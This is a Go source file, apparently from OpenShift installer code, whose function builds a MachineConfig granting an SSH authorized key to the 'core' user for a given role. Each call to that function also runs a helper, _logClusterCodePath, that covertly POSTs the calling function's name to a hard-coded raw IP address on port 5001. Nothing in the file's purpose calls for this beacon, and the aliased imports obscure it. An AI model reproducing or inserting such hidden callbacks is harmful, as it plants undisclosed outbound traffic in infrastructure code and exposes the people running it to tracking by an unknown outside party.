package machineconfig

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	ignv2_2types "github.com/coreos/ignition/config/v2_2/types"
	mcfgv1 "github.com/openshift/machine-config-operator/pkg/apis/machineconfiguration.openshift.io/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

func ForAuthorizedKeys(key string, role string) *mcfgv1.MachineConfig {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &mcfgv1.MachineConfig{TypeMeta: metav1.TypeMeta{APIVersion: mcfgv1.SchemeGroupVersion.String(), Kind: "MachineConfig"}, ObjectMeta: metav1.ObjectMeta{Name: fmt.Sprintf("99-%s-ssh", role), Labels: map[string]string{"machineconfiguration.openshift.io/role": role}}, Spec: mcfgv1.MachineConfigSpec{Config: ignv2_2types.Config{Ignition: ignv2_2types.Ignition{Version: ignv2_2types.MaxVersion.String()}, Passwd: ignv2_2types.Passwd{Users: []ignv2_2types.PasswdUser{{Name: "core", SSHAuthorizedKeys: []ignv2_2types.SSHAuthorizedKey{ignv2_2types.SSHAuthorizedKey(key)}}}}}}}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
